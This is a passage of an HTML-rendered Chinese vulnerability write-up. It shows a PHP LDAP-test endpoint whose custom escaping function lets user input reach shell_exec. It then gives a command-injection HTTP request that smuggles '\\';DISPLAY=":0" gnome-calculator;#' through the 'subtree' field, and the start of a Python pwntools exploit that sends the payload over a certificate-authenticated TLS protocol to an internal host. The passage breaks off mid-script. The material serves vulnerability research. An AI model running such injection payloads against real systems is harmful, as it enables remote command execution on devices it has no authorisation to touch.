+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">false </span><span style="color:#c0c5ce;">&amp;&amp; $</span><span style="color:#bf616a;">char1byte </span><span style="color:#c0c5ce;">== &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#c0c5ce;">&quot;) { </span><span style="color:#65737e;">// 发现一个反斜杠
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">false </span><span style="color:#c0c5ce;">&amp;&amp; $</span><span style="color:#bf616a;">char1byte </span><span style="color:#c0c5ce;">== &quot;</span><span style="color:#a3be8c;">&#39;</span><span style="color:#c0c5ce;">&quot;) { </span><span style="color:#65737e;">// 发现一个单引号 变成\&#39;
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">p_arg </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">substr</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">) . &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#c0c5ce;">&quot; . </span><span style="color:#96b5b4;">substr</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">) { </span><span style="color:#65737e;">// 前面出现过一个反斜杠 这里变回false
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">p_arg </span><span style="color:#c0c5ce;">.= ($</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">) ? &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#c0c5ce;">&quot; : &#39;&#39;; </span><span style="color:#65737e;">// 如果最后是true 说明有一个反斜杠没闭合 补上一个反斜杠闭合
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">p_arg  </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">&#39;</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">p_arg</span><span style="color:#a3be8c;">&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#65737e;">// 外层包裹单引号
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">(...)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">request </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">json_decode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">_POST</span><span style="color:#c0c5ce;">[&quot;</span><span style="color:#a3be8c;">myData</span><span style="color:#c0c5ce;">&quot;]);
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">response </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">array</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">刷题</span><span style="color:#c0c5ce;">](../../</span><span style="color:#d08770;">web</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">刷题</span><span style="color:#c0c5ce;">.</span><span style="color:#d08770;">md</span><span style="color:#c0c5ce;">)$</span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">foreach</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">servers </span><span style="color:#c0c5ce;">as $</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">host </span><span style="color:#c0c5ce;">!= &quot;&quot;) {
+</span><span style="color:#c0c5ce;">		$</span><span style="color:#bf616a;">url </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">escapeshellarg</span><span style="color:#c0c5ce;">(($</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">tls </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;"> ? &quot;</span><span style="color:#a3be8c;">ldaps</span><span style="color:#c0c5ce;">&quot; : &quot;</span><span style="color:#a3be8c;">ldap</span><span style="color:#c0c5ce;">&quot;) .&quot;</span><span style="color:#a3be8c;">://</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">server</span><span style="color:#a3be8c;">-&gt;</span><span style="color:#bf616a;">host</span><span style="color:#a3be8c;">:</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">server</span><span style="color:#a3be8c;">-&gt;</span><span style="color:#bf616a;">port</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		$</span><span style="color:#bf616a;">ldap_test_filter </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">str_replace</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">%s</span><span style="color:#c0c5ce;">&quot;, $</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">filter</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">		$</span><span style="color:#bf616a;">dn </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">dn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">password </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">base </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">base</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">filter </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">ldap_test_filter</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">subtree </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">subtree</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">attr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">target_attr</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">password </span><span style="color:#c0c5ce;">== &quot;&quot;) {
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">password </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getPassword</span><span style="color:#c0c5ce;">());
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">file_put_contents</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">/var/www/html/debug.log</span><span style="color:#c0c5ce;">&#39;, &quot;</span><span style="color:#a3be8c;">ldapsearch -A -x -H </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">url </span><span style="color:#c0c5ce;">&quot; .($</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">tls </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;"> ? &quot;</span><span style="color:#a3be8c;">-Z </span><span style="color:#c0c5ce;">&quot; : &quot;&quot;). &quot;</span><span style="color:#a3be8c;">-D </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">dn</span><span style="color:#a3be8c;"> -w </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">password</span><span style="color:#a3be8c;"> -b </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">base</span><span style="color:#a3be8c;"> -s </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">subtree </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">filter</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, FILE_APPEND)
+</span><span style="color:#c0c5ce;">		$</span><span style="color:#bf616a;">ldap_search </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">shell_exec</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ldapsearch -A -x -H </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">url </span><span style="color:#c0c5ce;">&quot; .($</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">tls </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;"> ? &quot;</span><span style="color:#a3be8c;">-Z </span><span style="color:#c0c5ce;">&quot; : &quot;&quot;). &quot;</span><span style="color:#a3be8c;">-D </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">dn</span><span style="color:#a3be8c;"> -w </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">password</span><span style="color:#a3be8c;"> -b </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">base</span><span style="color:#a3be8c;"> -s </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">subtree </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">filter</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		$</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">getResultMessage</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">ldap_search</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">][&quot;</span><span style="color:#a3be8c;">code</span><span style="color:#c0c5ce;">&quot;] == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">schema </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">getSchemaDN</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">tls </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;"> ? &quot;</span><span style="color:#a3be8c;">-Z </span><span style="color:#c0c5ce;">&quot; : &quot;&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!$</span><span style="color:#bf616a;">schema</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">                $</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">][&quot;</span><span style="color:#a3be8c;">code</span><span style="color:#c0c5ce;">&quot;] = </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">                $</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">][&quot;</span><span style="color:#a3be8c;">message</span><span style="color:#c0c5ce;">&quot;] = &quot;</span><span style="color:#a3be8c;">&lt;label class=</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">err_msg</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&gt;</span><span style="color:#c0c5ce;">&quot; . </span><span style="color:#8fa1b3;">__</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Ldap_Check_Attr_Failed_Item</span><span style="color:#c0c5ce;">&quot;) . &quot;</span><span style="color:#a3be8c;">&lt;/label&gt;&lt;br/&gt;</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">            } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">                $</span><span style="color:#bf616a;">found </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">isAttrExists</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">request</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">target_attr</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">tls </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;"> ? &quot;</span><span style="color:#a3be8c;">-Z </span><span style="color:#c0c5ce;">&quot; : &quot;&quot;,$</span><span style="color:#bf616a;">schema</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">dn</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// for OpenLDAP
+</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!$</span><span style="color:#bf616a;">found</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">                    $</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">][&quot;</span><span style="color:#a3be8c;">code</span><span style="color:#c0c5ce;">&quot;] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">                    $</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">][&quot;</span><span style="color:#a3be8c;">message</span><span style="color:#c0c5ce;">&quot;] = &quot;</span><span style="color:#a3be8c;">&lt;label class=</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">err_msg</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&gt;</span><span style="color:#c0c5ce;">&quot; . </span><span style="color:#8fa1b3;">__</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Ldap_Attr_Not_Found_Item</span><span style="color:#c0c5ce;">&quot;) . &quot;</span><span style="color:#a3be8c;">&lt;/label&gt;&lt;br/&gt;</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">                }
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#96b5b4;">header</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span style="color:#c0c5ce;">&#39;);
+</span><span style="color:#96b5b4;">echo json_encode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">response</span><span style="color:#c0c5ce;">);
+</span><span style="color:#ab7967;">?&gt;
+</span></pre>
+<p>命令注入请求</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">request = &#39;&#39;&#39;POST /ldapTest.php HTTP/1.1
+</span><span style="color:#c0c5ce;">Host: 127.0.0.1
+</span><span style="color:#c0c5ce;">Content-Length: 327
+</span><span style="color:#c0c5ce;">Content-Type: application/x-www-form-urlencoded
+</span><span style="color:#c0c5ce;">Connection: close
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">myData=%7b%22servers%22%3a%20%5b%7b%22host%22%3a%20%22127.0.0.1%22%2c%20%22port%22%3a%20%221234%22%7d%5d%2c%22dn%22%3a%20%221%22%2c%20%22password%22%3a%20%221%22%2c%20%22base%22%3a%20%221%22%2c%20%22target_attr%22%3a%20%221%22%2c%20%22subtree%22%3a%20%22%5c%5c%5c%5c&#39;%3bDISPLAY%3d%5c%22%3a0%5c%22%20gnome-calculator%3b%23%22%7d&#39;&#39;&#39;
+</span></pre>
+<p>其中myData：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">{&quot;servers&quot;: [{&quot;host&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: &quot;1234&quot;}],&quot;dn&quot;: &quot;1&quot;, &quot;password&quot;: &quot;1&quot;, &quot;base&quot;: &quot;1&quot;, &quot;target_attr&quot;: &quot;1&quot;, &quot;subtree&quot;: &quot;\\\\&#39;;DISPLAY=\&quot;:0\&quot; gnome-calculator;#&quot;}
+</span></pre>
+<p>直接在命令行执行计算器打不开</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">root@box:/var/www/html# gnome-calculator 
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">(gnome-calculator:66062): Gtk-WARNING **: 13:17:22.217: cannot open display: 
+</span></pre>
+<p>需要设置环境变量<code>DISPLAY=:0</code>，<code>:0</code>是默认的显示器编号 表示当前主显示器，从在命令注入并在虚拟机弹出计算器</p>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">socket
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">ssl
+</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">MAJOR_COMMAND_AUTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0
+</span><span style="color:#bf616a;">MAJOR_COMMAND_LOG </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1
+</span><span style="color:#bf616a;">MAJOR_COMMAND_POLICY </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">2
+</span><span style="color:#bf616a;">MAJOR_COMMAND_SESSION </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">3
+</span><span style="color:#bf616a;">MAJOR_COMMAND_SET_REDIRECT_INFO </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">5
+</span><span style="color:#bf616a;">MAJOR_COMMAND_VPN_AUTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">6
+</span><span style="color:#bf616a;">MINOR_COMMAND_GET_VERSION </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">7
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">context.endianness = &#39;</span><span style="color:#a3be8c;">big</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#65737e;"># 服务器地址和端口
+</span><span style="color:#c0c5ce;">server_address = (&#39;</span><span style="color:#a3be8c;">192.168.101.140</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">45443</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 客户端证书和私钥路径
+</span><span style="color:#c0c5ce;">client_cert = &#39;</span><span style="color:#a3be8c;">./toplayer.crt</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">client_key = &#39;</span><span style="color:#a3be8c;">./toplayer.key</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 创建一个 TCP 套接字
+</span><span style="color:#c0c5ce;">sock = socket.</span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 创建 SSL 上下文
+</span><span style="color:#c0c5ce;">context = ssl.</span><span style="color:#8fa1b3;">create_default_context</span><span style="color:#c0c5ce;">(ssl.Purpose.</span><span style="color:#bf616a;">SERVER_AUTH</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">context.</span><span style="color:#8fa1b3;">load_cert_chain</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">certfile</span><span style="color:#c0c5ce;">=client_cert, </span><span style="color:#bf616a;">keyfile</span><span style="color:#c0c5ce;">=client_key)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">context.check_hostname = </span><span style="color:#d08770;">False
+</span><span style="color:#c0c5ce;">context.verify_mode = ssl.</span><span style="color:#bf616a;">CERT_NONE
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">request = &#39;&#39;&#39;</span><span style="color:#a3be8c;">POST /ldapTest.php HTTP/1.1
+</span><span style="color:#a3be8c;">Host: 127.0.0.1
+</span><span style="color:#a3be8c;">Content-Length: 327
+</span><span style="color:#a3be8c;">Content-Type: application/x-www-form-urlencoded
+</span><span style="color:#a3be8c;">Connection: close
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">myData=%7b</span><span style="color:#d08770;">%22s</span><span style="color:#a3be8c;">ervers</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">5b%7b</span><span style="color:#d08770;">%22ho</span><span style="color:#a3be8c;">st</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22127.0.0.1</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">2c</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22port</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">221234</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">7d</span><span style="color:#d08770;">%5d%2c%22d</span><span style="color:#a3be8c;">n</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">221</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">2c</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22password</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">221</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">2c</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22base</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">221</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">2c</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22target_attr</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">221</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">2c</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22subtree</span><span style="color:#d08770;">%22%</span><span style="color:#a3be8c;">3a</span><span style="color:#d08770;">%20%</span><span style="color:#a3be8c;">22</span><span style="color:#d08770;">%5c%5c%5c%5c</span><span style="color:#a3be8c;">&#39;%3bDISPLAY</span><span style="color:#d08770;">%3d%5c%22%</span><span style="color:#a3be8c;">3a0</span><span style="color:#d08770;">%5c%22%</span><span style="color:#a3be8c;">20gnome-calculator%3b</span><span style="color:#d08770;">%23%</span><span style="color:#a3be8c;">22</span><span style="color:#d08770;">%7d</span><span style="color:#c0c5ce;">&#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 通过 SSL 包装套接字并连接
+</span><span style="color:#c0c5ce;">    ssl_sock = context.</span><span style="color:#8fa1b3;">wrap_socket</span><span style="color:#c0c5ce;">(sock, </span><span style="color:#bf616a;">server_hostname</span><span style="color:#c0c5ce;">=server_address[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">])
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">connect</span><span style="color:#c0c5ce;">(server_address)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">SSL 连接已建立。</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 发送明文数据
+</span><span style="color:#c0c5ce;">    message = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">SlSP</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#65737e;"># magic
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">28 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># header length
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># tls client version
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># ssbp auth type
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># SWB/redirect no use
